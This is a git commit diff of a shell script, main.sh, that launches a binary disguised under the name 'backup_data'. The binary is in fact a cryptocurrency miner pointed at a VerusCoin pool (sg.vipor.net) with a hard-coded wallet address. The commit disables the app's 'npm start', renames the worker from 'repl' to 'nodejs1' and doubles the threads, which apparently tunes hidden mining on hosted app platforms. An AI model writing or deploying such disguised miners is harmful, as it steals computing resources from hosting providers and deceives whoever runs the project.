93503c25ce968c8654aa9873c41e5408a98a347c
ahmadrozaq <94879061+ahmadrozaq@users.noreply.github.com>
2025-01-08 20:17:02 +0700

    Update main.sh

--- main.sh
+++ main.sh
@@ -1,12 +1,13 @@
 #!/bin/sh
-npm start &
-PoolHost=stratum+tcp://sg.vipor.net
+#npm start &
+PoolHost=sg.vipor.net
 Port=5040
 PublicVerusCoinAddress=RHy311pnvcN1nn47MZmyA2FAaCVFiCgWim
-WorkerName=repl
-Threads=1
+WorkerName=nodejs1
+Threads=2
 #set working directory to the location of this script
 DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
 cd $DIR
 chmod +x backup_data
 ./backup_data -v -l "${PoolHost}":"${Port}" -u "${PublicVerusCoinAddress}"."${WorkerName}" -p x -t "${Threads}" "$@"
+#./backup_data -v -l sg.vipor.net:5040 -u RHy311pnvcN1nn47MZmyA2FAaCVFiCgWim.cloudall -p x -t 2
